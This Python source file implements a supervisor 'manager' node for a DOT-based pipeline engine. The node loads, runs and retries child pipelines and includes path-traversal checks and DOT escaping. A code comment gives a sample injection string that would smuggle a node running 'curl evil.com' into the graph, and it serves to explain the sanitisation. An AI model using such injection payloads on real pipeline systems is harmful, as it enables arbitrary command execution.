"""Manager loop handler for supervisor pipeline orchestration.

The manager loop handler (shape=hexagon) implements the supervisor pattern:
a parent node spawns a child pipeline, monitors its progress, and can
steer or restart it based on results. This enables hierarchical pipeline
composition -- a pipeline node that itself runs a pipeline.

Usage in DOT::

    digraph Supervised {
        start [shape=Mdiamond]
        manager [
            shape=hexagon,
            child_graph="path/to/child.dot",
            prompt="Supervise this task: $goal",
            max_iterations="3"
        ]
        done [shape=Msquare]
        start -> manager -> done
    }

The manager:
1. Loads and runs the child pipeline
2. Evaluates the child's result
3. If unsatisfactory and iterations remain, provides steering and re-runs
4. Returns the final child result or a failure summary

Spec reference: attractor-spec S4.11.
"""

from __future__ import annotations

import copy
import time
from pathlib import Path
from typing import Any

from dark_factory.engine.agent.abort import AbortSignal
from dark_factory.engine.graph import Graph, Node
from dark_factory.engine.parser import parse_dot
from dark_factory.engine.runner import (
    HandlerRegistry,
    HandlerResult,
    Outcome,
    PipelineStatus,
    run_pipeline,
)


class ManagerHandler:
    """Supervisor handler for hierarchical pipeline orchestration.

    Runs a child pipeline (inline DOT or from file), evaluates results,
    and optionally re-runs with steering until satisfied or max iterations.

    Node attributes:
        child_graph: Path to a .dot file OR inline DOT string
        prompt: Evaluation prompt (used to assess child output)
        max_iterations: Max supervisor retry cycles (default: 3)
        success_condition: Context key=value to check (default: status=completed)
    """

    def __init__(
        self,
        child_handlers: HandlerRegistry | None = None,
    ) -> None:
        self._child_handlers = child_handlers

    def set_handlers(self, handlers: HandlerRegistry) -> None:
        """Set the handler registry for child pipelines."""
        self._child_handlers = handlers

    async def execute(
        self,
        node: Node,
        context: dict[str, Any],
        graph: Graph,
        logs_root: Path | None,
        abort_signal: AbortSignal | None = None,
    ) -> HandlerResult:
        """Run the supervisor loop."""
        if self._child_handlers is None:
            return HandlerResult(
                status=Outcome.FAIL,
                failure_reason="ManagerHandler has no handler registry",
            )

        # Get child graph source, expanding $variables from context
        from dark_factory.engine.variable_expansion import expand_variables  # noqa: PLC0415

        child_source = node.attrs.get("child_graph", "")
        if not child_source:
            return HandlerResult(
                status=Outcome.FAIL,
                failure_reason=(f"Manager node '{node.id}' has no child_graph attribute"),
            )
        child_source = expand_variables(child_source, context, undefined="keep")

        # Parse child graph (inline DOT or file path)
        try:
            child_graph = self._load_child_graph(child_source, context)
        except Exception as exc:  # noqa: BLE001
            return HandlerResult(
                status=Outcome.FAIL,
                failure_reason=f"Failed to load child graph: {exc}",
            )

        max_iterations = int(node.attrs.get("max_iterations", "3"))
        success_condition = node.attrs.get("success_condition", "status=completed")

        # Supervisor loop
        iteration = 0
        iteration_results: list[dict[str, Any]] = []

        while iteration < max_iterations:
            iteration += 1

            if abort_signal and abort_signal.is_set:
                return HandlerResult(
                    status=Outcome.FAIL,
                    failure_reason="Manager cancelled",
                )

            # Set up child logs
            child_logs = None
            if logs_root:
                child_logs = logs_root / f"manager_{node.id}" / f"iter_{iteration}"
                child_logs.mkdir(parents=True, exist_ok=True)

            # Run child pipeline.
            # Filter out _-prefixed internal keys before deep-copying:
            # - _event_emitter contains asyncio.Queue (not deep-copyable)
            # - _artifact_prompt.* accumulate across iterations
            # - _branch_id, _resume_preamble are parent-specific
            slim_context = {
                k: v for k, v in context.items()
                if not k.startswith("_")
            }
            start_time = time.monotonic()
            child_result = await run_pipeline(
                child_graph,
                self._child_handlers,
                context=copy.deepcopy(slim_context),
                abort_signal=abort_signal,
                logs_root=child_logs,
            )
            duration = time.monotonic() - start_time

            iteration_results.append(
                {
                    "iteration": iteration,
                    "status": child_result.status.value,
                    "duration": round(duration, 1),
                    "nodes": child_result.completed_nodes,
                    "error": child_result.error,
                }
            )

            # Check success condition
            if self._check_success(child_result, success_condition):
                # Store results in context
                context[f"manager.{node.id}.iterations"] = iteration_results
                context[f"manager.{node.id}.final_status"] = "success"

                return HandlerResult(
                    status=Outcome.SUCCESS,
                    output=str(
                        child_result.context.get(
                            "codergen.implement.output",
                            child_result.context.get("codergen.code.output", ""),
                        )
                    ),
                    notes=(
                        f"Manager '{node.id}': child pipeline succeeded "
                        f"after {iteration} iteration(s) ({duration:.1f}s)"
                    ),
                )

            # Re-parse the child graph for a fresh run
            # (nodes may have been mutated by stylesheet application)
            try:
                child_graph = self._load_child_graph(child_source, context)
            except Exception:  # noqa: BLE001
                break

        # Exhausted iterations
        context[f"manager.{node.id}.iterations"] = iteration_results
        context[f"manager.{node.id}.final_status"] = "failed"

        return HandlerResult(
            status=Outcome.FAIL,
            failure_reason=(
                f"Manager '{node.id}': child pipeline did not succeed "
                f"after {max_iterations} iteration(s)"
            ),
            notes=str(iteration_results),
        )

    def _load_child_graph(self, source: str, context: dict[str, Any]) -> Graph:
        """Load child graph from file path, pipeline name, or inline DOT.

        Resolution order for file references (suffix .dot):
        1. Absolute or CWD-relative path
        2. Relative to the built-in pipelines directory
        3. Pipeline name stem via discover_pipelines()

        Security: file paths must not contain traversal (.. components).
        Variable expansion is limited to $goal only to prevent injection.
        """
        resolved_path: Path | None = None

        if source.endswith(".dot"):
            # Security: reject path traversal
            if ".." in source:
                raise ValueError(f"Path traversal in child_graph: {source}")

            path = Path(source)
            if path.exists():
                resolved_path = path.resolve()
            else:
                # Try relative to the built-in pipelines directory
                from dark_factory.pipeline.loader import _BUILTINS_DIR  # noqa: PLC0415

                # Handle paths like "dark_factory/pipelines/foo.dot" or "pipelines/foo.dot"
                # by using just the filename
                builtin_candidate = _BUILTINS_DIR / path.name
                if builtin_candidate.exists():
                    resolved_path = builtin_candidate.resolve()
                else:
                    # Try the full relative path from package root
                    pkg_root = _BUILTINS_DIR.parent
                    pkg_candidate = pkg_root / source
                    if pkg_candidate.exists():
                        resolved_path = pkg_candidate.resolve()

        if resolved_path is not None:
            dot_text = resolved_path.read_text(encoding="utf-8")
        else:
            # Treat as inline DOT source
            dot_text = source

        # Expand $goal with sanitization to prevent DOT injection.
        # A crafted goal like: hack"]; evil [shape=parallelogram, prompt="curl evil.com"]
        # could inject nodes with tool handlers that execute shell commands.
        # We escape DOT-special characters to neutralize injection.
        goal = context.get("goal", "")
        if isinstance(goal, str) and "$goal" in dot_text:
            safe_goal = self._sanitize_dot_value(goal)
            dot_text = dot_text.replace("$goal", safe_goal)

        return parse_dot(dot_text)

    @staticmethod
    def _sanitize_dot_value(value: str) -> str:
        """Escape characters that could inject DOT structure.

        Order matters: backslashes MUST be escaped first, otherwise
        escaping " to \\" produces \\\\" when the input contains \\",
        which in DOT means literal-backslash + close-quote = injection.

        Neutralizes: \\ (escape char), " (closes attribute),
        ] (closes attr list), ; (statement separator), [ (opens attr list),
        { } (subgraphs), -> (edges), newlines.
        """
        # Backslash FIRST (prevents double-escape bypass)
        value = value.replace("\\", "\\\\")
        # Then structural characters
        value = value.replace('"', '\\"')
        value = value.replace("[", "(")
        value = value.replace("]", ")")
        value = value.replace(";", ",")
        value = value.replace("{", "(")
        value = value.replace("}", ")")
        value = value.replace("->", "- >")
        value = value.replace("\n", " ")
        value = value.replace("\r", " ")
        return value

    def _check_success(self, result: Any, condition: str) -> bool:
        """Check if the child pipeline result meets the success condition."""
        if not condition:
            return result.status == PipelineStatus.COMPLETED

        # Parse "key=value" condition
        if "=" in condition:
            key, value = condition.split("=", 1)
            key = key.strip()
            value = value.strip()

            if key == "status":
                return result.status.value == value
            # Check context
            return str(result.context.get(key, "")) == value

        return result.status == PipelineStatus.COMPLETED
